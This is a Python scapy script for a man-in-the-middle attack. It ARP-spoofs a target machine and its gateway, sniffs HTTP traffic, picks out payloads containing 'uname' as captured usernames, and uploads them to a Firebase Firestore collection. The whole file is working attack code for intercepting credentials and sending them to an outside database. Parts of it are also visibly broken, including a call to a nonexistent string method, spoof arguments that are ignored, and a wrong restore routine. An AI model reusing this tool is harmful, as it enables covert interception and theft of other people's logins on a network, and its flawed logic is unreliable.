import threading
import socket

import firebase_admin
import scapy.all as scapy
import time

from firebase_admin import firestore
from scapy.layers import http
from scapy.layers.dns import DNS
from scapy.layers.http import HTTP
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Raw
from scapy.sendrecv import sniff
from firebase_admin import credentials


class Mitm:

    @classmethod
    def get_mac(cls, ip):#This proccess get and ip and search the mac by arp protocol
        print("trying to get mac of: " + ip)
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        print(f"get mac of {ip}: {answered_list[0][1].hwsrc}")
        return answered_list[0][1].hwsrc

    def __init__(self, target_ip, gateway_ip, user_uuid):
        #init function, setup variables.
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.user_uuid = user_uuid
        self.threads = []
        self.target = [self.target_ip,  Mitm.get_mac(self.target_ip)]
        self.gateway = [self.gateway_ip, Mitm.get_mac(self.gateway_ip)]
        cred = credentials.Certificate('./serviceAccountKey.json')
        firebase_admin.initialize_app(cred)
        self.db = firestore.client()
        self.packets = []



    def restore(self, destination_ip, source_ip):
        #This function should reset the arp table of the targets.
        destination_mac = self.gateway[1]
        source_mac = self.target[1]
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=False)

    def send_router(self, packet):
        #This function get the packet we sniffing and append it to the lit.
        self.packets.append(packet)
        if IP in packet:
            if packet[IP].src == self.target[0]:
                if HTTP in packet:
                    try:
                        print(packet.show())
                        if(packet.show().contains("uname") and Raw in packet):
                            self.packets.append(packet)
                    except:
                        pass


    def sniffing(self):
        #This function call to the scapy function sniff
        sniff(prn=lambda packet: self.send_router(packet))

    def spoof(self, target_ip, spoof_ip):
        #This function spoof the arp table
        packet = scapy.ARP(op=2, pdst=self.target[0], hwdst=self.target[1],
                           psrc=spoof_ip)
        scapy.send(packet, verbose=False)


    def spoofing(self):
        #This is a multitasking threading function which spoof the router and the target.
        while True:
            self.spoof(self.target_ip, self.gateway_ip)
            self.spoof(self.gateway_ip, self.target_ip)


    def start(self):
        #Start the threading.
        try:
            th1 = threading.Thread(target=self.spoofing)
            th2 = threading.Thread(target=self.sniffing)
            self.threads.append(th1)
            self.threads.append(th2)
            th2.start()
            th1.start()
        except KeyboardInterrupt:
            print("\nCtrl + C pressed.............Exiting")
            self.restore(self.gateway_ip, self.target_ip)
            self.restore(self.target_ip, self.gateway_ip)
            print("[+] Arp Spoof Stopped")

    def stop(self):
        #Stop the proccess and upload the data to the cloud database.
        for thread in self.threads:
            try:
                thread.exit()
            except:
                pass
        last = "Data: "
        for packet in self.packets:
            if Raw in packet and HTTP in packet:
                last += f"{str(packet[Raw].load)}\n"
        try:
            last = "username:" + last.split("uname")[1]
        except:
            pass
        self.db.collection("mitm").document(self.user_uuid).set({"data":last})


